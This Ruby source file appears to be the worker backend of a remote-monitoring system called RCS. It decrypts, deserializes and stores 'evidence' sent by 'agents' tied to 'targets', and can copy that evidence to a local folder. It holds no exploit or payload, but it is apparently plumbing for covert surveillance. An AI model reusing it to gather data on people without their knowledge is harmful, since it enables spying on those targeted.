require_relative 'audio_processor'

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/evidence'

if File.directory?(Dir.pwd + '/lib/rcs-worker-release')
  require 'rcs-db-release/config'
  require 'rcs-db-release/db_layer'
  require 'rcs-db-release/grid'
else
  require 'rcs-db/config'
  require 'rcs-db/db_layer'
  require 'rcs-db/grid'
end

require 'mongo'
require 'openssl'
require 'digest/sha1'

# specific evidence processors
Dir[File.dirname(__FILE__) + '/evidence/*.rb'].each do |file|
  require file
end

module RCS
module Worker

class InstanceProcessor
  include RCS::Tracer
  
  SLEEP_TIME = 10
  
  def initialize(instance, ident)
    @evidences = []
    @state = :stopped
    @seconds_sleeping = 0
    
    # get info about the agent instance from evidence db
    #@db = Mongo::Connection.new(RCS::DB::Config.instance.global['CN'], 27017).db("rcs")
    @agent = Item.agents.where({ident: ident, instance: instance}).first
    raise "Agent \'#{ident}:#{instance}\' cannot be found." if @agent.nil?

    @target = @agent.get_parent

    trace :info, "Created processor for agent #{@agent['ident']}:#{@agent['instance']}"
    
    # the log key is passed as a string taken from the db
    # we need to calculate the MD5 and use it in binary form
    trace :debug, "Evidence key #{@agent['logkey']}"
    @key = Digest::MD5.digest @agent['logkey']

    @process = Proc.new do
      resume

      until sleeping_too_much?
        until @evidences.empty?
          resume
          evidence_id = BSON::ObjectId(@evidences.shift)

          begin
            start_time = Time.now

            # get binary evidence
            data = RCS::DB::GridFS.get(evidence_id, "evidence")
            raise "Empty evidence" if data.nil?

            raw = data.read

=begin
            if forwarding?
              hash = Digest::SHA1.hexdigest(raw)
              Dir.mkdir "forwarded" unless File.exists? "forwarded"
              path = "forwarded/#{hash}.raw"
              f = File.open(path, 'w') {|f| f.write raw}
              trace :debug, "[#{evidence_id}] forwarded raw evidence #{evidence_id} to #{path}"
            end
=end

            # deserialize binary evidence and forward decoded
            evidences = begin
              RCS::Evidence.new(@key).deserialize(raw) do |data|
                if forwarding?
                  path = "forwarded/#{evidence_id}.dec"
                  f = File.open(path, 'w') {|f| f.write data}
                  trace :debug, "[#{evidence_id}] forwarded decoded evidence #{evidence_id} to #{path}"
                end
              end
            rescue EmptyEvidenceError => e
              trace :info, "[#{evidence_id}] deleting empty evidence #{evidence_id}"
              RCS::DB::GridFS.delete(evidence_id, "evidence")
              next
            rescue EvidenceDeserializeError => e
              trace :warn, "[#{evidence_id}] decoding failed for #{evidence_id}: #{e.to_s}, deleting..."
              RCS::DB::GridFS.delete(evidence_id, "evidence")
              next
            end

            next if evidences.nil?

            ev_type = ''

            evidences.each do |ev|

              next if ev.empty?

              # store evidence_id inside evidence, we need it inside processors
              ev[:db_id] = evidence_id

              # store agent instance in evidence (used when storing into db)
              ev[:instance] = @agent['instance']
              ev[:ident] = @agent['ident']

              trace :debug, "[#{evidence_id}] processing evidence of type #{ev[:type]}"

              # find correct processing module and extend evidence
              mod = "#{ev[:type].to_s.capitalize}Processing"
              ev.extend eval(mod) if RCS.const_defined? mod.to_sym
              ev.process if ev.respond_to? :process

              # override original type
              ev[:type] = ev.type if ev.respond_to? :type
              ev_type = ev[:type]

              ev.store @agent, @target

              if forwarding? and ev[:grid_content]
                Dir.mkdir "forwarded" unless File.exists? "forwarded"
                path = "forwarded/#{evidence_id}_#{ev_type}.grid"
                f = File.open(path, 'w') {|f| f.write ev[:grid_content]}
                trace :debug, "[#{evidence_id}] forwarded grid evidence #{evidence_id} to #{path}"
              end

              #
              # FORWARDER: forward&sign parsed evidence
              #
            end

            processing_time = Time.now - start_time
            trace :info, "[#{evidence_id}] processed #{ev_type.upcase} for agent #{@agent['name']} in #{processing_time} sec"

            RCS::DB::GridFS.delete(evidence_id, "evidence")
            trace :debug, "[#{evidence_id}] deleted raw evidence"

          rescue Mongo::ConnectionFailure => e
            trace :error, "[#{evidence_id}] cannot connect to database, retrying in 5 seconds ..."
            sleep 5
            retry
          rescue Exception => e
            trace :fatal, "FAILURE: " << e.to_s
            trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")

            Dir.mkdir "forwarded" unless File.exists? "forwarded"
            path = "forwarded/#{evidence_id}.raw"
            f = File.open(path, 'w') {|f| f.write raw}
            trace :debug, "[#{evidence_id}] forwarded undecoded evidence #{evidence_id} to #{path}"
          end
        end
        take_some_rest
      end

      put_to_sleep
    end
    
    #@call_processor = CallProcessor.new
  end
  
  def resume
    @state = :running
    #RCS::EvidenceManager.instance.sync_status({:instance => @agent['instance']}, RCS::EvidenceManager::SYNC_PROCESSING)
    @seconds_sleeping = 0
  end
  
  def take_some_rest
    sleep 1
    @seconds_sleeping += 1
    #trace :debug, "processor #{@id} takes some sleep [slept #{@seconds_sleeping} seconds]."
  end
  
  def put_to_sleep
    @state = :stopped
    #RCS::EvidenceManager.instance.sync_status({:instance => @agent['instance']}, RCS::EvidenceManager::SYNC_IDLE)
    trace :debug, "processor #{self.object_id} is sleeping too much, let's stop!"
  end
  
  def finished?
    @state == :stopped
  end

  def forwarding?
    RCS::DB::Config.instance.global['FORWARD'] == true
  end
  
  def sleeping_too_much?
    @seconds_sleeping >= SLEEP_TIME
  end
  
  def queue(id)
    @evidences << id unless id.nil?
    
    if finished?
      trace :debug, "deferring work for #{@agent['instance']}"
      EM.defer @process
      #EM.defer @restat
    end
  end
  
  def to_s
    "instance #{@agent['instance']}: #{@evidences.size}"
  end
  
end

end # ::Worker
end # ::RCS
